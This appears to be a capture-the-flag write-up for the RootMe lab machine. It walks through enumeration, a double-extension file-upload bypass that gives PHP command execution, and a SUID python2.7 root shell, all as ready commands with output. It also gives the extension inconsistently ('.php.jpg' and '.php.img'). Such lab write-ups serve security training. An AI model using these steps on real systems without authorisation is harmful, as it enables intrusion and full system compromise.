# RootMe CTF Challenge Write-Up

## Overview

This walkthrough documents the privilege escalation path used to compromise the RootMe machine from a web application upload vulnerability to root access.

The challenge begins with a standard service enumeration phase, followed by a web application review, a file upload bypass, and a final local privilege escalation using a vulnerable SUID binary.

---

## 1. Initial Reconnaissance

### Network Enumeration

The first step is to identify open ports and the services running on the target.

```bash
nmap 10.114.180.224 -sV
```

### Result Summary

```text
PORT     STATE  SERVICE  VERSION
22/tcp   open   ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp   open   http     Apache httpd 2.4.41 ((Ubuntu))
```

This indicates a Linux-based machine with:

- SSH exposed on port 22
- A web service running on port 80

---

## 2. Web Enumeration

### Directory Discovery

We enumerate the web application to discover interesting paths and files.

```bash
feroxbuster -u http://10.114.180.224/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
```

### Discovered Paths

```text
http://10.114.180.224/js/maquina_de_escrever.js
http://10.114.180.224/css/panel.css
http://10.114.180.224/css/home.css
http://10.114.180.224/js/
http://10.114.180.224/panel/
http://10.114.180.224/uploads/
```

The most interesting directory was:

```text
http://10.114.180.224/uploads/
```

![Image Placeholder: RootMe uploads directory](./assets/uploads-page.png)

---

## 3. File Upload Vulnerability

### Observation

The application does not allow direct `.php` uploads. However, uploading a file with a double extension such as `.php.jpg` or `.php.img` may bypass the validation.

This is a classic extension validation bypass, where the backend checks only a portion of the file name or inspects the wrong extension pattern.

### Exploit Flow

The file was uploaded with a deceptive extension that still executes as PHP when the server interprets the file.

```bash
# Example of a bypass payload naming convention
payload.php.jpg
```

The resulting upload can be accessed via the web root as:

```text
http://10.114.180.224/uploads/payload.php.jpg
```

![Image Placeholder: Upload bypass demonstration](./assets/upload-bypass.png)

### Weaponized Web Shell

Once uploaded successfully, the script can be used to execute commands via the web server context.

```bash
find / -name user.txt 2>/dev/null
```

### User Flag

```text
/var/www/user.txt
```

This confirms the web server user has access to the target machine and that the application was properly exploited.

---

## 4. Privilege Escalation to Root

### Identify SUID Binaries

To escalate privileges, we search for executables with the SUID bit set.

```bash
find / -perm -4000 -type f -ls 2>/dev/null
```

### Relevant Finding

```text
/usr/bin/python2.7
```

This is a key privilege escalation primitive because Python 2.7 can be used to spawn a shell with elevated privileges if executed with the `-p` flag (preserve effective privileges).

---

## 5. Root Shell Exploit

### Command Used

```bash
/usr/bin/python2.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

### Verification

```bash
id
```

### Result

```text
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
```

This confirms that the current shell is running as root, despite the web server process originally being under the `www-data` user.

---

## 6. Final Step: Capture Root Flag

Once root access is obtained, navigate to the root directory and read the root flag.

```bash
cd /root
cat root.txt
```

The challenge is successfully completed once the root flag is retrieved.

---

## 7. Summary of the Exploit Chain

1. Enumerated the target with `nmap`
2. Discovered the web application and upload directory
3. Identified an extension validation bypass using `.php.img`
4. Uploaded a PHP payload to obtain command execution
5. Retrieved the `user.txt` file
6. Found a vulnerable SUID binary: `/usr/bin/python2.7`
7. Spawned a root shell with preserved privileges
8. Read the root flag from `/root/root.txt`

---

## 8. Key Takeaways

- Web uploads must validate file types robustly at the server and application layers.
- Attackers often bypass naive extension checks using double extensions or alternate naming patterns.
- SUID misconfigurations can allow local privilege escalation if the binary is susceptible.
- Linux privilege escalation via `python2.7 -p` is a classic example of unsafe SUID binaries.

> Important: This challenge demonstrates how a seemingly harmless upload filter can become a full remote command execution primitive when implemented insecurely.

> Note: The bypass works because the server likely checks for a string like `.php` in a limited manner and does not properly normalize the filename or enforce strict extension validation.

---

## 9. Practical Notes

When reproducing this challenge in a controlled environment:

- Keep the payload simple and test file upload filtering first.
- Confirm how the backend interprets the filename before exploiting it.
- Validate shell access before moving to privilege escalation.
- Use minimal commands to reduce noise during the write-up.

---

## 10. Appendix: Relevant Commands

```bash
nmap 10.114.180.224 -sV
feroxbuster -u http://10.114.180.224/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
find / -name user.txt 2>/dev/null
find / -perm -4000 -type f -ls 2>/dev/null
/usr/bin/python2.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
id
cd /root
cat root.txt
```

This appendix consolidates the core workflow used to complete the challenge.

---

## Final Result

The RootMe challenge is solved by combining a file upload bypass with a local privilege escalation using SUID `python2.7`, resulting in a successful root shell and retrieval of the root flag.

![Image Placeholder: Final root shell confirmation](./assets/root-shell.png)

